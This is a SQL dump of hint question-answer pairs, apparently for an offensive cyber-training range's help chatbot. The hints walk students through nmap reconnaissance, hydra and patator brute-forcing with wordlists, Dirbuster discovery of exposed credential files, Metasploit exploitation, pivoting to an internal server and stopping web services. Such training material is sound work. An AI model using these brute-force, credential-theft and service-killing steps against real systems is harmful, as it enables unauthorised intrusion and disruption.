INSERT [dbo].[api_questionanswerpair] ([id], [mission_catalog_id_id], [objective_id], [utterance], [normalized_utterance], [answer], [difficulty], [uid]) VALUES (411, NULL, NULL, N'What is procexp?', N'what is procexp', N'Procexp, short for process explorer, is a Windows tool from the sysinternals tool suite. Procexp shows a list of active processes, and can be used to determine what handles or DLLs processes have open or loaded, among other things.', NULL, N'2f42cb1887594c478ccab4e45683e9ca')
INSERT [dbo].[api_questionanswerpair] ([id], [mission_catalog_id_id], [objective_id], [utterance], [normalized_utterance], [answer], [difficulty], [uid]) VALUES (412, 4, NULL, N'how do I find the DNS IP address?', N'how do i find the dns ip address', N'You can pass the IP address of the C2 server or your Kali box to the nslookup command to find the DNS server''s IP.', N'e', N'1f05cf277e904a118bb948653b3b91ea')
INSERT [dbo].[api_questionanswerpair] ([id], [mission_catalog_id_id], [objective_id], [utterance], [normalized_utterance], [answer], [difficulty], [uid]) VALUES (413, 4, NULL, N'how do I find the router IP address?', N'how do i find the router ip address', N'Use the command ''ip route'' to view the routing table and find the default router''s IP address.', N'e', N'89e2c62afa02464eaef87c8bb37329a9')
INSERT [dbo].[api_questionanswerpair] ([id], [mission_catalog_id_id], [objective_id], [utterance], [normalized_utterance], [answer], [difficulty], [uid]) VALUES (414, 4, NULL, N'how do I use nmap?', N'how do i use nmap', N'You can scan myloot.com with nmap to find the IP address, the service running, and the port running the service. Use the -T5 and the -A flags to be sure nmap accurately identifies the service.', N'e', N'a6b1b7f54ad247a0bcd0076a86d61a6d')
INSERT [dbo].[api_questionanswerpair] ([id], [mission_catalog_id_id], [objective_id], [utterance], [normalized_utterance], [answer], [difficulty], [uid]) VALUES (415, 4, NULL, N'how do I find the malware?', N'how do i find the malware', N'This is an offensive mission, you don''t need to be looking for malware.', N'e', N'e5cbd15d005241409b3be3052bce4a52')
INSERT [dbo].[api_questionanswerpair] ([id], [mission_catalog_id_id], [objective_id], [utterance], [normalized_utterance], [answer], [difficulty], [uid]) VALUES (416, 4, NULL, N'what are my credentials?', N'what are my credentials', N'Supplied usernames and passwords will follow the format - username: user<#>, password: P@ssedU<#> (where <#> is the user number appearing in your command line prompt on the first terminal you''re given)', N'e', N'ccd3abfd8e3e4ac899b1f97847ad2fc0')
INSERT [dbo].[api_questionanswerpair] ([id], [mission_catalog_id_id], [objective_id], [utterance], [normalized_utterance], [answer], [difficulty], [uid]) VALUES (417, 4, NULL, N'what tools should I use for this mission?', N'what tools should i use for this mission', N'For this mission you will need nmap to find the target webserver and any services running there. You will also need either Patator or Hydra to attack a vulnerable service. If you are attacking the SSH protocol you are better off using Patator. For VNC you should use Hydra. For Telnet, Patator is more reliable but will probably take a long time, so you may be better off using Hydra even if it returns the wrong password on the first couple tries.', N'e', N'60faedaff6c948abbf6114b3433a2324')
INSERT [dbo].[api_questionanswerpair] ([id], [mission_catalog_id_id], [objective_id], [utterance], [normalized_utterance], [answer], [difficulty], [uid]) VALUES (418, 4, NULL, N'how do I gather credentials?', N'how do i gather credentials', N'You should use either hydra or patator to brute force the service running on the C2 server.', N'e', N'652cb0000c6142b29072aad90ba6573b')
INSERT [dbo].[api_questionanswerpair] ([id], [mission_catalog_id_id], [objective_id], [utterance], [normalized_utterance], [answer], [difficulty], [uid]) VALUES (419, 4, NULL, N'how do I gather credentials with hydra?', N'how do i gather credentials with hydra', N'Hydra requires very similar information to brute force ssh, vnc, and telnet. In all cases you will need to supply hydra with the location of the password dictionary you''d like to use, the C2 server IP address, the port the C2 server is running the service on, and the name of the service you want to attack. For ssh and telnet you should also supply the login name (admin in this case). The command should follow this pattern, omitting the -l admin for vnc: hydra -l admin -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt <service name>://<IP of C2 server>:<C2 port numer>', N'e', N'74ee143f7ae94ceabe9cdd29f1f5042f')
INSERT [dbo].[api_questionanswerpair] ([id], [mission_catalog_id_id], [objective_id], [utterance], [normalized_utterance], [answer], [difficulty], [uid]) VALUES (420, 4, NULL, N'how do I gather credentials with patator?', N'how do i gather credentials with patator', N'Patator does not have a manual entry and can have complex syntax. If you use the patator command in your kali terminal it will print a list of available modules, and if you use the command followed by a module name (e.g. patator ssh_login) patator will display that module''s options and an example of using the module. Like hydra you should provide patator with the password dictionary located at /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt', N'e', N'7ac5fccb017149cfbe8a7d9b6293389a')
INSERT [dbo].[api_questionanswerpair] ([id], [mission_catalog_id_id], [objective_id], [utterance], [normalized_utterance], [answer], [difficulty], [uid]) VALUES (421, 4, NULL, N'what username should I use?', N'what username should i use', N'You should use the username admin when trying to brute force your way into the target system.', N'e', N'0e83b4f9c9d34441817adfb94b5d6a54')
INSERT [dbo].[api_questionanswerpair] ([id], [mission_catalog_id_id], [objective_id], [utterance], [normalized_utterance], [answer], [difficulty], [uid]) VALUES (422, 4, NULL, N'how do I open a terminal in the vnc session?', N'how do i open a terminal in the vnc session', N'Once you have a VNC session open to the C2 server, you can open a terminal window by right clicking on ''File System'' and choosing the ''Open Terminal Here'' option from the menu.', N'e', N'b442efe57fa44beda305e8b60d9f98ec')
INSERT [dbo].[api_questionanswerpair] ([id], [mission_catalog_id_id], [objective_id], [utterance], [normalized_utterance], [answer], [difficulty], [uid]) VALUES (423, 4, NULL, N'how do I do objective 1', N'how do i do objective 1', N'There are two key steps needed to complete objective 1. Step 1: find the IP address of the C2 server, and find a service running on the C2 server that is susceptible to a brute force attack. Step 2: use a brute forcing tool to exploit the vulnerability.', N'e', N'8498ca941af7475b93d113030a22aae0')
INSERT [dbo].[api_questionanswerpair] ([id], [mission_catalog_id_id], [objective_id], [utterance], [normalized_utterance], [answer], [difficulty], [uid]) VALUES (424, 4, 1, N'how do I do step 1', N'how do i do step 1', N'You can scan myloot.com with nmap to find the IP address, the service running, and the port running the service. Use the -T5 and the -A flags to be sure nmap accurately identifies the service.', N'e', N'2061dbe3246d41a9a45bf62106eb3392')
INSERT [dbo].[api_questionanswerpair] ([id], [mission_catalog_id_id], [objective_id], [utterance], [normalized_utterance], [answer], [difficulty], [uid]) VALUES (425, 4, NULL, N'how do I find the C2 server?', N'how do i find the c2 server', N'You can scan myloot.com with nmap to find the IP address, the service running, and the port running the service. Use the -T5 and the -A flags to be sure nmap accurately identifies the service.', N'e', N'ab510639ceee463092bda2bde74ce031')
INSERT [dbo].[api_questionanswerpair] ([id], [mission_catalog_id_id], [objective_id], [utterance], [normalized_utterance], [answer], [difficulty], [uid]) VALUES (426, 4, NULL, N'how do I scan myloot.com with nmap?', N'how do i scan myloot.com with nmap', N'You can scan myloot.com with nmap to find the IP address, the service running, and the port running the service. Use the -T5 and the -A flags to be sure nmap accurately identifies the service.', N'e', N'421cc2daf4d844d38e77da3dde8695df')
INSERT [dbo].[api_questionanswerpair] ([id], [mission_catalog_id_id], [objective_id], [utterance], [normalized_utterance], [answer], [difficulty], [uid]) VALUES (427, 4, NULL, N'how do I find the port running the service?', N'how do i find the port running the service', N'Nmap is a useful command line tool for exploring a computer network. Other tools that may prove useful for reconnaissance include but are not limited to: dig, traceroute, nslookup, netcat (nc), and of course, ping.', N'e', N'e9b3fbe9682e42ea9d30927bc127b61b')
INSERT [dbo].[api_questionanswerpair] ([id], [mission_catalog_id_id], [objective_id], [utterance], [normalized_utterance], [answer], [difficulty], [uid]) VALUES (428, 4, 1, N'how do I do step 2', N'how do i do step 2', N'Depending on which service you found you should use patator or hydra to login to the server via a brute force attack. Hydra has a useful manual entry you can view. Patator does not have a manual entry, but entering the command patator in your terminal will display available modules, and typing the command followed by a module name (e.g. patator ssh_login) will show information about using that module.', N'e', N'97ff2f416c7f44e3b0ef86e46fc03552')
INSERT [dbo].[api_questionanswerpair] ([id], [mission_catalog_id_id], [objective_id], [utterance], [normalized_utterance], [answer], [difficulty], [uid]) VALUES (429, 4, NULL, N'how do I use hydra?', N'how do i use hydra', N'Hydra requires very similar information to brute force ssh, vnc, and telnet. In all cases you will need to supply hydra with the location of the password dictionary you''d like to use, the C2 server IP address, the port the C2 server is running the service on, and the name of the service you want to attack. When attacking ssh and telnet you should also include the username. The command should follow this pattern, ommiting the -l admin for vnc: hydra -l admin -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt <service name>://<IP of C2 server>:<C2 port numer>', N'e', N'0ea4632576194a7b94b40e42702b281f')
INSERT [dbo].[api_questionanswerpair] ([id], [mission_catalog_id_id], [objective_id], [utterance], [normalized_utterance], [answer], [difficulty], [uid]) VALUES (430, 4, NULL, N'how do I use patator?', N'how do i use patator', N'Patator does not have a manual entry and can have complex syntax. If you use the patator command in your terminal, assuming patator is installed, it will print a list of available modules. If you use the command followed by a module name (e.g. patator ssh_login) patator will display that module''s options and an example of using the module. Like hydra, you should provide patator with a password dictionary.', N'e', N'1b950a79aabb43a58f10f2537c92851a')
INSERT [dbo].[api_questionanswerpair] ([id], [mission_catalog_id_id], [objective_id], [utterance], [normalized_utterance], [answer], [difficulty], [uid]) VALUES (431, 4, NULL, N'how do I do objective 2?', N'how do i do objective 2', N'You need to login to the C2 server via the vulnerable service using the credentials you found.', N'e', N'b14989e11d00496999c8fe6a19ce3a70')
INSERT [dbo].[api_questionanswerpair] ([id], [mission_catalog_id_id], [objective_id], [utterance], [normalized_utterance], [answer], [difficulty], [uid]) VALUES (432, 4, NULL, N'how do I login to the C2 server via ssh?', N'how do i login to the c2 server via ssh', N'Try the command ssh -p <port number> <username>@<ip address>', N'e', N'fdf55cc293a4406eb34fc3448ec36fe8')
INSERT [dbo].[api_questionanswerpair] ([id], [mission_catalog_id_id], [objective_id], [utterance], [normalized_utterance], [answer], [difficulty], [uid]) VALUES (433, 4, NULL, N'how do I login to the C2 server via vnc?', N'how do i login to the c2 server via vnc', N'Try the command vncviewer <ip address>:<port number>. After supplying your credentials you will enter a VNC terminal session where you can open a command line terminal to operate on the host.', N'e', N'64d9591e93e146f19c6225e8677ac9e4')
INSERT [dbo].[api_questionanswerpair] ([id], [mission_catalog_id_id], [objective_id], [utterance], [normalized_utterance], [answer], [difficulty], [uid]) VALUES (434, 4, NULL, N'how do I login to the C2 server via telnet?', N'how do i login to the c2 server via telnet', N'Try the command telnet <ip address> <port number>', N'e', N'35aa8589e683432a93e16644824748c3')
INSERT [dbo].[api_questionanswerpair] ([id], [mission_catalog_id_id], [objective_id], [utterance], [normalized_utterance], [answer], [difficulty], [uid]) VALUES (435, 4, NULL, N'how do I login to the C2 server?', N'how do i login to the c2 server', N'If you''re logging on via ssh, try the command: ssh -p <port number> <username>@<ip address>. If you''re logging on via telnet, try the command: telnet <ip address> <port number>. If you''re logging in via vnc, try the command: vncviewer <ip address>:<port number>. After supplying your credentials for vnc you can open a command line terminal to operate on the host.', N'e', N'9991ed8af493456fb1834d35f1873399')
INSERT [dbo].[api_questionanswerpair] ([id], [mission_catalog_id_id], [objective_id], [utterance], [normalized_utterance], [answer], [difficulty], [uid]) VALUES (436, 4, NULL, N'how do I do objective 3?', N'how do i do objective 3', N'When you''ve logged into the C2 server, you need to kill the web service.', N'e', N'1709cd61ee2e41a29c9082bd2a3f7d29')
INSERT [dbo].[api_questionanswerpair] ([id], [mission_catalog_id_id], [objective_id], [utterance], [normalized_utterance], [answer], [difficulty], [uid]) VALUES (437, 4, NULL, N'how do I kill the web service?', N'how do i kill the web service', N'Run the following command to shut down a Linux web service: sudo service httpd stop. Alternatively you could use ps to determine which processes are running, then use the kill command to kill the httpd service.', N'e', N'2fb5f25127d14e51a6e21768db80f259')
INSERT [dbo].[api_questionanswerpair] ([id], [mission_catalog_id_id], [objective_id], [utterance], [normalized_utterance], [answer], [difficulty], [uid]) VALUES (438, 4, NULL, N'how do I find the Kali IP address?', N'how do i find the kali ip address', N'On your Kali box, use the command ''ip a''. View the manpage for more information.', N'm', N'f0214cde5fad4b658b7eae08f8ca95eb')
INSERT [dbo].[api_questionanswerpair] ([id], [mission_catalog_id_id], [objective_id], [utterance], [normalized_utterance], [answer], [difficulty], [uid]) VALUES (439, 4, NULL, N'how do I find the DNS IP address?', N'how do i find the dns ip address', N'You can pass the IP address of the C2 server or your Kali box to the nslookup command to find the DNS server''s IP.', N'm', N'320f602ba64842d8839d34cafc10068f')
INSERT [dbo].[api_questionanswerpair] ([id], [mission_catalog_id_id], [objective_id], [utterance], [normalized_utterance], [answer], [difficulty], [uid]) VALUES (440, 4, NULL, N'how do I find the router IP address?', N'how do i find the router ip address', N'You might need to use nmap to find the IP address of the router in this mission. Consider finding the correct subnet on the network map then using nmap to scan an appropriate range of IP addresses.', N'm', N'cef936a1cb324c9085691e055b83ebd7')
INSERT [dbo].[api_questionanswerpair] ([id], [mission_catalog_id_id], [objective_id], [utterance], [normalized_utterance], [answer], [difficulty], [uid]) VALUES (441, 4, NULL, N'how do I use nmap?', N'how do i use nmap', N'You can use nmap to narrow down the possibilities for the correct IP addresses for myloot.com, one of which is the C2 server. You can obtain all the possible IP addresses using dig with the +short flag, redirect the output to a file, and supply the file to nmap with the -iL flag. You should also use the -T5 and the -A flags to be sure nmap accurately identifies the service.', N'm', N'0203de0fce574b2298118de12a7579b2')
INSERT [dbo].[api_questionanswerpair] ([id], [mission_catalog_id_id], [objective_id], [utterance], [normalized_utterance], [answer], [difficulty], [uid]) VALUES (442, 4, NULL, N'what are my credentials?', N'what are my credentials', N'Supplied usernames and passwords will follow the format - username: user<#>, password: P@ssedU<#> (where <#> is the user number appearing in your command line prompt on the first terminal you''re given)', N'm', N'12a4204bd9b545619de9a8058a8d42f1')
INSERT [dbo].[api_questionanswerpair] ([id], [mission_catalog_id_id], [objective_id], [utterance], [normalized_utterance], [answer], [difficulty], [uid]) VALUES (443, 4, NULL, N'how do I find the malware?', N'how do i find the malware', N'This is an offensive mission, you don''t need to be looking for malware.', N'm', N'328a13b1210f4c6690c829b816cdadb5')
INSERT [dbo].[api_questionanswerpair] ([id], [mission_catalog_id_id], [objective_id], [utterance], [normalized_utterance], [answer], [difficulty], [uid]) VALUES (444, 4, NULL, N'what tools should I use for this mission?', N'what tools should i use for this mission', N'The primary tool you should use for this mission is Dirbuster, although you should expect to use nmap and possibly dig as well to find the C2 server. Depending on what OS is running on the target, you will need to log in using ssh or the Metasploit psexec module.', N'm', N'996d92552ea4452897b1190c68f7d7a3')
INSERT [dbo].[api_questionanswerpair] ([id], [mission_catalog_id_id], [objective_id], [utterance], [normalized_utterance], [answer], [difficulty], [uid]) VALUES (445, 4, NULL, N'how do I gather credentials?', N'how do i gather credentials', N'You should use Dirbuster to find a file containing credentials on the C2 server. This file was mistakenly left accessible to the public.', N'm', N'2f26284a81204239b48f598e3340392e')
INSERT [dbo].[api_questionanswerpair] ([id], [mission_catalog_id_id], [objective_id], [utterance], [normalized_utterance], [answer], [difficulty], [uid]) VALUES (446, 4, NULL, N'how do I scan myloot.com with nmap?', N'how do i scan myloot.com with nmap', N'You can use nmap to narrow down the possibilities for the correct IP addresses for myloot.com, one of which is the C2 server. You can obtain all the possible IP addresses using dig with the +short flag, redirect the output to a file, and supply the file to nmap with the -iL flag. You should also use the -T5 and the -A flags to be sure nmap accurately identifies the service.', N'm', N'200a37f0b84a42208f21c534262112cf')
INSERT [dbo].[api_questionanswerpair] ([id], [mission_catalog_id_id], [objective_id], [utterance], [normalized_utterance], [answer], [difficulty], [uid]) VALUES (447, 4, NULL, N'how do I do objective 1?', N'how do i do objective 1', N'There are three steps needed to complete this objective. Step 1: narrow down the search for the C2 server using dig and nmap (there is a best way to do this). Step 2: use dirbuster to find credentials that were mistakenly left available to the public from the webserver. Step 3: acquire the files with a tool like wget, and view the credentials kept in the files.', N'm', N'7743e3e03694417baa5ac6071963dd78')
INSERT [dbo].[api_questionanswerpair] ([id], [mission_catalog_id_id], [objective_id], [utterance], [normalized_utterance], [answer], [difficulty], [uid]) VALUES (448, 4, NULL, N'how do I find the C2 server?', N'how do i find the c2 server', N'The dns name myloot.com will map to multiple IP addresses (which you can verify with dig, the reverse dns lookup tool) so that domain name alone is not enough to identify the C2 server. Use dig and include the +short flag after the domain name to print only the IP addresses and redirect the output to a file. You need to narrow down your search with nmap, which you can do quickly by passing the filename to nmap with the -iL option.', N'm', N'7a506df2ccf84afda5dd463d18df0d9a')
INSERT [dbo].[api_questionanswerpair] ([id], [mission_catalog_id_id], [objective_id], [utterance], [normalized_utterance], [answer], [difficulty], [uid]) VALUES (449, 4, 1, N'how do I do step 1?', N'how do i do step 1', N'The dns name myloot.com will map to multiple IP addresses (which you can verify with dig, the reverse dns lookup tool) so that domain name alone is not enough to identify the C2 server. Use dig and include the +short flag after the domain name to print only the IP addresses and redirect the output to a file. You need to narrow down your search with nmap, which you can do quickly by passing the filename to nmap with the -iL option.', N'm', N'c7ebe1623daf436896f051da514a9c57')
INSERT [dbo].[api_questionanswerpair] ([id], [mission_catalog_id_id], [objective_id], [utterance], [normalized_utterance], [answer], [difficulty], [uid]) VALUES (450, 4, 1, N'how do I do step 2?', N'how do i do step 2', N'Open dirbuster, then provide the tool with the URL of the suspected C2 server (e.g. http://<suspected C2 IP>), check the Go Faster checkbox, supply dirbuster with a list of directories to request from, and change the desired file extension to txt. Finally, click the start button and monitor the dirbuster output in the terminal for the users.txt and passwords.txt files. If you do not find them, you should try again using a different possible C2 IP address.', N'm', N'4ffc674c857e480186b077f36b9210df')
INSERT [dbo].[api_questionanswerpair] ([id], [mission_catalog_id_id], [objective_id], [utterance], [normalized_utterance], [answer], [difficulty], [uid]) VALUES (451, 4, NULL, N'where is the list of directories?', N'where is the list of directories', N'There is a directory list located on your Kali box in the file /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt', N'm', N'2f721cf77f5f49b2bbcdc03d87f3cab3')
INSERT [dbo].[api_questionanswerpair] ([id], [mission_catalog_id_id], [objective_id], [utterance], [normalized_utterance], [answer], [difficulty], [uid]) VALUES (452, 4, 1, N'how do I do step 3?', N'how do i do step 3', N'Once you''ve found the credentials files you can use the command line tool wget to acquire them since they are not properly secured on the webserver. When you have acquired the files view them with the cat command.', N'm', N'40e39b6af90c4c828d252aa7b717b110')
INSERT [dbo].[api_questionanswerpair] ([id], [mission_catalog_id_id], [objective_id], [utterance], [normalized_utterance], [answer], [difficulty], [uid]) VALUES (453, 4, NULL, N'how do I do objective 2?', N'how do i do objective 2', N'You need to login to the C2 server via the vulnerable service using the credentials you found.', N'm', N'2c372f3a42ab40b4850846cb51904b45')
INSERT [dbo].[api_questionanswerpair] ([id], [mission_catalog_id_id], [objective_id], [utterance], [normalized_utterance], [answer], [difficulty], [uid]) VALUES (454, 4, NULL, N'how do I login to the C2 server?', N'how do i login to the c2 server', N'If the C2 server is a Linux machine you can SSH to it, and if the C2 server is a Windows machine you can use the metasploit psexec module.', N'm', N'3d649766d9ec47adb5e976dde3f3f364')
INSERT [dbo].[api_questionanswerpair] ([id], [mission_catalog_id_id], [objective_id], [utterance], [normalized_utterance], [answer], [difficulty], [uid]) VALUES (455, 4, NULL, N'how do I do objective 3?', N'how do i do objective 3', N'When you''ve logged into the C2 server, you need to kill the web service.', N'm', N'eece2de9d8bb44849483f0a176666e0d')
INSERT [dbo].[api_questionanswerpair] ([id], [mission_catalog_id_id], [objective_id], [utterance], [normalized_utterance], [answer], [difficulty], [uid]) VALUES (456, 4, NULL, N'how do I kill the webservice?', N'how do i kill the webservice', N'Run the following command to shut down a Linux web service: sudo service httpd stop. Alternatively you could use ps to determine which processes are running, then use the kill command to kill the httpd service. On Windows you can run this command to kill an IIS service: net stop w3svc.', N'm', N'b9c76603abe14b9eb70e6213b1b89bcc')
INSERT [dbo].[api_questionanswerpair] ([id], [mission_catalog_id_id], [objective_id], [utterance], [normalized_utterance], [answer], [difficulty], [uid]) VALUES (457, 5, NULL, N'what tools should I use for this mission?', N'what tools should i use for this mission', N'For this mission you will definitely need nmap to find the server and any vulnerable services, ssh to login to the target boxes, and msfconsole to aid in exploiting the vulnerable service. You may also find a use for netcat, python, strings, and/or mount while you try to penetrate deeper into the target network.', N'e', N'828aed47e85e4f1189915552c3d0d8a3')
INSERT [dbo].[api_questionanswerpair] ([id], [mission_catalog_id_id], [objective_id], [utterance], [normalized_utterance], [answer], [difficulty], [uid]) VALUES (458, 5, NULL, N'how do I find the Kali IP address?', N'how do i find the kali ip address', N'On your Kali box, use the command ''ip a''. View the manpage for more information.', N'e', N'8be9427b7d3745c8a05566f37a736cd6')
INSERT [dbo].[api_questionanswerpair] ([id], [mission_catalog_id_id], [objective_id], [utterance], [normalized_utterance], [answer], [difficulty], [uid]) VALUES (459, 5, NULL, N'how do I find the DNS IP address?', N'how do i find the dns ip address', N'You can pass the IP address of the C2 server or your Kali box to the nslookup command to find the DNS server''s IP.', N'e', N'2724e2f674a948149837a6b850cfd57a')
INSERT [dbo].[api_questionanswerpair] ([id], [mission_catalog_id_id], [objective_id], [utterance], [normalized_utterance], [answer], [difficulty], [uid]) VALUES (460, 5, NULL, N'how do I find the router IP address?', N'how do i find the router ip address', N'Use the command ''ip route'' to view the routing table and find the default router''s IP address.', N'e', N'50d9276b4b87477bb3a66efc4886fc30')
INSERT [dbo].[api_questionanswerpair] ([id], [mission_catalog_id_id], [objective_id], [utterance], [normalized_utterance], [answer], [difficulty], [uid]) VALUES (461, 5, NULL, N'how do I find the firewall IP address?', N'how do i find the firewall ip address', N'The firewall forwards traffic to web1, the server hosting thor.com, so you can pass that domain name to the nslookup command to find the firewall IP address.', N'e', N'241cdb13ecd54f8cad508e40b30abc70')
INSERT [dbo].[api_questionanswerpair] ([id], [mission_catalog_id_id], [objective_id], [utterance], [normalized_utterance], [answer], [difficulty], [uid]) VALUES (462, 5, NULL, N'what are my credentials?', N'what are my credentials', N'Supplied usernames and passwords will follow the format - username: user<#>, password: P@ssedU<#> (where <#> is the user number appearing in your command line prompt on the first terminal you''re given)', N'e', N'8ab2284c09f94e7482781721d13fa73c')
INSERT [dbo].[api_questionanswerpair] ([id], [mission_catalog_id_id], [objective_id], [utterance], [normalized_utterance], [answer], [difficulty], [uid]) VALUES (463, 5, NULL, N'how do I find the malware?', N'how do i find the malware', N'This is an offensive mission, you don''t need to be looking for malware.', N'e', N'8199a0da25494053a45aafbc38a519c2')
INSERT [dbo].[api_questionanswerpair] ([id], [mission_catalog_id_id], [objective_id], [utterance], [normalized_utterance], [answer], [difficulty], [uid]) VALUES (464, 5, NULL, N'how do I find the C2 server?', N'how do i find the c2 server', N'To find vulnerable services on the target webserver, as well as the IP address, you can use the command nmap -Pn -v thor.com --top-ports 5000', N'e', N'56e40ae22bf64899a5d3f8e2950a2f64')
INSERT [dbo].[api_questionanswerpair] ([id], [mission_catalog_id_id], [objective_id], [utterance], [normalized_utterance], [answer], [difficulty], [uid]) VALUES (465, 5, NULL, N'how do I connect to the base command workstation?', N'how do i connect to the base command workstation', N'If you found port 80, you''ve discovered a standard HTTP server. Try connecting to thor.com via a web browser. If you found port 2121 or 3632, you can connect to the open port with netcat using the command nc thor.com <port number>', N'e', N'641da7480cee4181812fb3d218261836')
INSERT [dbo].[api_questionanswerpair] ([id], [mission_catalog_id_id], [objective_id], [utterance], [normalized_utterance], [answer], [difficulty], [uid]) VALUES (466, 5, NULL, N'how do I gather credentials?', N'how do i gather credentials', N'There are multiple places you can look on the webserver to find credentials. you could look for unusual logs in the /var/log directory, you could look for credentials by decompressing /var/backups/backup.tar.gz, or you could look for printable strings in /usr/bin/defaults.', N'e', N'dec3fcfd484b44dba5257aec1109488f')
INSERT [dbo].[api_questionanswerpair] ([id], [mission_catalog_id_id], [objective_id], [utterance], [normalized_utterance], [answer], [difficulty], [uid]) VALUES (467, 5, NULL, N'how do I do objective 1?', N'how do i do objective 1', N'In the mission orders you were given the domain name thor.com. There are two steps to this objective. Step 1: using nmap find the server and a vulnerable service running on the server. Step 2: establish a connection to the target webserver via the vulnerable service.', N'e', N'988ff223c23147f180e232792fffaa5f')
INSERT [dbo].[api_questionanswerpair] ([id], [mission_catalog_id_id], [objective_id], [utterance], [normalized_utterance], [answer], [difficulty], [uid]) VALUES (468, 5, 1, N'how do I do step 1?', N'how do i do step 1', N'To find the C2 IP address and accurately identify the vulnerable service, you should scan thor.com using nmap with the -Pn and -v flags, and passing the option --top-ports 5000.', N'e', N'afcb66cf7d7c4cd99091d61516b201e2')
INSERT [dbo].[api_questionanswerpair] ([id], [mission_catalog_id_id], [objective_id], [utterance], [normalized_utterance], [answer], [difficulty], [uid]) VALUES (469, 5, 1, N'how do I do step 2?', N'how do i do step 2', N'If you find port 80 you''ve found a HTTP server and you can connect to the server through a web browser by going to thor.com. If you find port 2121 or 3632, you can connect to the server with netcat, e.g. nc thor.com 2121', N'e', N'1e918fae8f9d464b81a4f3bd89fb5ac4')
INSERT [dbo].[api_questionanswerpair] ([id], [mission_catalog_id_id], [objective_id], [utterance], [normalized_utterance], [answer], [difficulty], [uid]) VALUES (470, 5, NULL, N'how do I do objective 2?', N'how do i do objective 2', N'For objective 2 you should use metasploit to exploit the vulnerability. Which exploit module you use will depend on what service you find running - port 80 usually indicates a HTTP server, port 2121 usually indicates vsftpd, and port 3632 usually indicates distcc.', N'e', N'd92c9f9c65f74bf6bb0da8069784d12f')
INSERT [dbo].[api_questionanswerpair] ([id], [mission_catalog_id_id], [objective_id], [utterance], [normalized_utterance], [answer], [difficulty], [uid]) VALUES (471, 5, NULL, N'how do I do objective 3?', N'how do i do objective 3', N'Completing the previous objective with metasploit should grant you administrative access, but you should do a few things after the connection is established to ensure things run smoothly. If You''re exploiting Drupal you should enter the command "shell" followed by the command "bash -i". Now, regardless of what you are exploiting, you should spawn a shell with python to emulate a terminal session.', N'e', N'e138a8ee8e1648349c44f38b2a4a1efe')
INSERT [dbo].[api_questionanswerpair] ([id], [mission_catalog_id_id], [objective_id], [utterance], [normalized_utterance], [answer], [difficulty], [uid]) VALUES (472, 5, NULL, N'how do I do objective 4?', N'how do i do objective 4', N'To complete this objective, you must find credentials stored on the webserver. There are a few places they can be found - you could look for unusual logs in the /var/log directory, you could look for credentials by decompressing /var/backups/backup.tar.gz, or you could look for printable strings in /usr/bin/defaults.', N'e', N'4156646049d44ac7941c6a9ecb6ab7b9')
INSERT [dbo].[api_questionanswerpair] ([id], [mission_catalog_id_id], [objective_id], [utterance], [normalized_utterance], [answer], [difficulty], [uid]) VALUES (473, 5, NULL, N'how do I do objective 5?', N'how do i do objective 5', N'The webserver has a connection to a second internal server. To complete this objective there are two steps. Step 1: find the IP address of the other server. Step 2: ssh to the second server with the credentials found in objective 4.', N'e', N'47ffde01428743d69afdb14a4f7b3c7b')
INSERT [dbo].[api_questionanswerpair] ([id], [mission_catalog_id_id], [objective_id], [utterance], [normalized_utterance], [answer], [difficulty], [uid]) VALUES (474, 5, 5, N'how do I do step 1?', N'how do i do step 1', N'There are a few ways to find the IP of the second server. You can search the contents of /etc/fstab or you can look for clues using the command: netstat -tnp. You can also look for clues by examining the list of currently mounted file systems by running the command: mount', N'e', N'b588fe312bc5459f9938532bdc5fc2b9')
INSERT [dbo].[api_questionanswerpair] ([id], [mission_catalog_id_id], [objective_id], [utterance], [normalized_utterance], [answer], [difficulty], [uid]) VALUES (475, 5, 5, N'how do I do step 2?', N'how do i do step 2', N'You can ssh to the server using the password found in objective 4.', N'e', N'937bb9437efb4e4eb1ab94b07e1afdde')
INSERT [dbo].[api_questionanswerpair] ([id], [mission_catalog_id_id], [objective_id], [utterance], [normalized_utterance], [answer], [difficulty], [uid]) VALUES (476, 5, NULL, N'how do I do objective 6?', N'how do i do objective 6', N'There is a secret file in idrago''s home directory on the internal server. View the contents of the file with the cat command.', N'e', N'a36932c7281b4d689c83ac18ea1f86bc')
INSERT [dbo].[api_questionanswerpair] ([id], [mission_catalog_id_id], [objective_id], [utterance], [normalized_utterance], [answer], [difficulty], [uid]) VALUES (477, 5, NULL, N'how do I find the Kali IP address?', N'how do i find the kali ip address', N'On your Kali box, use the command ''ip a''. View the manpage for more information.', N'm', N'a301ae7b7379465d9abb3d4c21166ec6')
INSERT [dbo].[api_questionanswerpair] ([id], [mission_catalog_id_id], [objective_id], [utterance], [normalized_utterance], [answer], [difficulty], [uid]) VALUES (478, 5, NULL, N'how do I find the DNS IP address?', N'how do i find the dns ip address', N'You can pass the IP address of the C2 server or your Kali box to the nslookup command to find the DNS server''s IP.', N'm', N'2d110f42b971457787899f7c613177c8')
INSERT [dbo].[api_questionanswerpair] ([id], [mission_catalog_id_id], [objective_id], [utterance], [normalized_utterance], [answer], [difficulty], [uid]) VALUES (479, 5, NULL, N'how do I find the router IP address?', N'how do i find the router ip address', N'Use the command ''ip route'' to view the routing table and find the default router''s IP address.', N'm', N'03fbd2c34b254109b3ff0b578a6c7fdc')
INSERT [dbo].[api_questionanswerpair] ([id], [mission_catalog_id_id], [objective_id], [utterance], [normalized_utterance], [answer], [difficulty], [uid]) VALUES (480, 5, NULL, N'how do I find the C2 server IP address?', N'how do i find the c2 server ip address', N'You were given the domain name thor.com in the mission orders. Scan this domain with nmap. You should use the -Pn flag to ignore discovery (i.e. assume a host is up without pinging first), and the -v flag to increase verbosity (i.e. increase the amount of information nmap displays).', N'm', N'd958668a6ac344769e75c4c1ca104731')
INSERT [dbo].[api_questionanswerpair] ([id], [mission_catalog_id_id], [objective_id], [utterance], [normalized_utterance], [answer], [difficulty], [uid]) VALUES (481, 5, NULL, N'what tools should I use for this mission?', N'what tools should i use for this mission', N'For this mission you will need nmap to find the server and any vulnerable services, netcat to connect to the service, and John the Ripper and metasploit to penetrate deeper into the target network. You may also need to use additional tools, including but not limited to the Python and/or C programming languages to aid you in exploiting vulnerabilities, msfvenom to create a metasploit payload, and scp to transfer files between different machines.', N'm', N'3780773624a446a7908e3d89240202e3')
